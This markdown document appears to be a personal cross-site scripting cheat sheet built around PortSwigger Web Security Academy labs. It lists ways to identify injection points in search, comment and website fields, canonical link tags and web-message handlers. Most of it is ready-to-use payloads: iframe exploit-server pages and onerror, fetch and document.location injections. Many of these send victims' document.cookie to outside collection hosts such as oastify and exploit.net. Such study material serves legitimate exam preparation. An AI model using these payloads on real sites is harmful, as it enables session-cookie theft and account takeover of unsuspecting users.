# Cross-site Scripting
> You can add your own custom `cookie` in ensuring the crafted payload works by executing the following payload in `console`:

```javascript
document.cookie="neverTellAnyone"
test'payload
test\payload
test`payload
```

## Quick Identifying Sequence
1. Identifying in **Home Page** by finding out the suspicious script like 
- `addEventListener('message')`. Please refer to [XSS Using Web Messages](#xss-using-web-messages)
- <body ng-app>. Please refer [this page](https://0aa100330328274c80c40d0500590057.web-security-academy.net/).
- use `DOM Invader` Extension for **prototype pollution**.
- Does it contain `canonical` link tag?

2. Identifying in **Search** Function by sending the following payload in **Search Field**:
    > [This payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads) may be would be a good option in trigerring xss vul
    ```javascript
    <script>alert(1)</script>
    ```
    Then, Observe the result based on these conditions:
    - Is BlockedTag? Just jump into `intruder` action to find out the **allowed tags**. You can refer to [Blocked Tags is Identified](#blocked-tags-is-identified) section.
    - Does it contain any JSON file? Is there any suspicious `<script>` that processes the **search input**? Please trigger the following advance payloads, observe the result before exploiting [these payloads](#suspicious-script-is-identified).
        ```javascript
        <>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
        ```
        **OR**
        ```javascript
        fuzzer\';console.log(12345);//
        ```
        **OR**
        ```javascript
        fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
        ```

3. Identifying in **Blog Post** page, by sending the following payload in 
    - **Comment** Field:
        ```javascript
        <script>alert(1)</script>
        <><img src=1 onerror=alert(1)>
        <><img src="https://EXPLOIT.net/img">
        <img src=1 onerror=alert(1)>
        <script src=1 onerror=alert(1)></script>
        <video src=1 onerror=alert(1)></video>
        ```
    - Is there any suspicious `<script>` that processes the **comment**?
  
    - **Website** Field, check whether this field requires `http:|https:` pattern or has `onclick` attribute in DOM?

        Then, Observe the result based on these conditions:
        - is StoredXSS in `Comment` field trigerred? Just Craft the regular `XSS steal cookie` payload
        - is there **suspicious** process in `onclick` attribute? please jump into [Suspicious `onclick` atribute point](#suspicious-onclick-attribute-in-website-field-of-comment-list)
        - is there any suspicious `js` file that process the comment request? Please jump into [Suspicious Js File in Comment Function Point](#suspicious-js-file-that-processes-comment)


## Exploit Payload
### Canonical Link Tag
Please refer to [this lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag).
- trigger the vulnerability
    ```java script
    https://webID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
    ```
- Exploit using the trigerred payload (**using document.location**)
    ```javascript
    https://webID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27document%2elocation=%60https://collaboratorOastify.oastify.com/?c=${document.cookie}%60
    ```
-  Exploit using the trigerred payload (**using fetch**)
    ```javascript
    https://webID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27fetch(%60https://collaboratorOastify.oastify.com/?c=${document.cookie}%60)
    ```

### XSS Using Web Messages
1. [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
    - Manual Trigger in Console, the message will reflected in the page
      ```javascript
      window.postMessage("test","*")
      ```
    
    - Payload in Exploit Server
      ```javascript
      <iframe src="https://webID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=javascript:document.location=`https://collaboratorOastifyCom/?c=${window.location.href}`>','*')">
      ```

2. [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
    - Manual Trigger in Console, the message will reflected in the page
      ```javascript
      window.postMessage("javascript:alert(1)//https://test","*")
      ```
    
    - Payload in Exploit Server
      ```javascript
      <iframe src="https://webID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://collaboratorOastifyCom/?c=${window.location.href}`//https://','*')">
      ```

3. [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
    - Manual Trigger in Console, the message will reflected in the page
      ```javascript
      window.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.cookie='TopSecret=UnsecureCookieValue4Peanut2019';javascript:document.location=`https://collaboratorOastifyCom/?c=${window.location.href}`+document.cookie\"}","*")
      ```
    
    - Payload in Exploit Server
        - using `fetch`
            ```javascript
            <iframe src=https://webId.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch(`https://collaboratorOastifyCom/?c=${window.location.href}`+document.cookie)\"}","*")'>
            ```
        
        - using `document.location`
            ```javascript
            <iframe src=https://webId.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.location=`https://collaboratorOastifyCom/?c=${document.cookie}`+document.cookie\"}","*")'>
            ```

        - using **BotesJuan**'s Suggestion. I used `backtick` instrad of `single quote`
            ```javascript
            <iframe src=https://webId.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
            "type": "load-channel",
            "url": "JavaScript:document.location=`https://collaboratorOastify?c=${window.location.href}`+document.cookie"
            }), "*");'>
            ```

### BLocked Tags is Identified
I think we only need to refer to:
1. [**BoatesJuan**'s Suggestion](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#bypass-blocked-tags)

2. [Related Port Swigger Web](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) or [SVG mark-up](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)


### Suspicious Script is Identified
> Observe how the `script` processes the **keywords** in Search Function and find the **correct payload** to exploit the vulnerabitily as follows:

1. On [hashChange](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
    ```javascript
    <iframe src="https://webID.web-security-academy.net/#" onload="document.location='http://collaboratorOastify/?cookies='+document.cookie"></iframe>
    ```

2. [single quote and backslash escaped](https://0a5500260385b188804a085600750099.web-security-academy.net/?search=test%5C%27)
    - ensure the follwoing payload works in `search` field
        ```javascript
        </script><script>document.location="https://collaboratorOastifyCom/?cookie="+document.cookie</script>
        ```

    - Exploit server Payload 1:
        ```javascript
        location="https://webID.web-security-academy.net/?search=%3C%2Fscript%3E%3Cscript%3Edocument.location%3D%22https%3A%2F%2FcollaboratorOastify.oastify.com%2F%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E"
        ```
    - Exploit server Payload 2 using `</ScRiPt >` in case he application gave error message `Tag is not allowed`:
        ```javascript
        location="https://webID.web-security-academy.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FcollaboratorOastify.oastify.com%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
        ```

3. [angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
    - trigger an alert in `search` field
        ```javascript
        \'-alert(1)//
        ```

4. Does it process a JSON file?
   - trigger alert in `search` field
        ```javascript
        "-alert(1)-"
        '};alert(1);//
        ```
   - Ensure the payload works
        ```javasript
        "-(window["document"]["location"]="https://webID%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
        ```
        **OR**
        ```javascript
        "}; location="https://collaboratorOastify/?"+document.cookie;//
        ```
   
5. Does it Contain `LastViewed` in Cookie?
   - trigger an alert first
    ```javascript
    <iframe src="https://TARGET.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
    ```
   - Exploit the trigerred payload
    ```javascript
    <iframe src="https://webID.web-security-academy.net/product?productId=1&'><script>document.location=`https://collaboratorOastify/?c=${document.cookie}`</script>" onload="if(!window.x)this.src='https://webID.web-security-academy.net';window.x=1;">
    ```

### Suspicious `js` file that processes **comment**
   > It's better if you observe how the script works
   
   - trigger the following payload:
        ```javascript
        <><img src=1 onerror=alert(1)>
        ```
   - Exploit using yhe trigerred payload
        ```javascript
        <><img src=1 onerror=fetch('https://caqu19rxvnkn5iga42n1807jtaz1ntphe.oastify.com/?c='+document.cookie)>
        ```
        **OR this kind of references**
        ```javascript
        <img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">

        <><img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)>

        <img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>
        ```
   
### Suspicious `onclick` attribute in Website Field of Comment List
- trigger an alert using the following payload:
    ```javascript
    http://foo?&apos;-alert(1)-&apos;
    ```
- Exploit the trigerred payload:
    ```javascript
    https://foo?&apos;-fetch(&grave;https://collaboratorOastify/?c=${document.cookie}&grave;)-&apos;
    ```

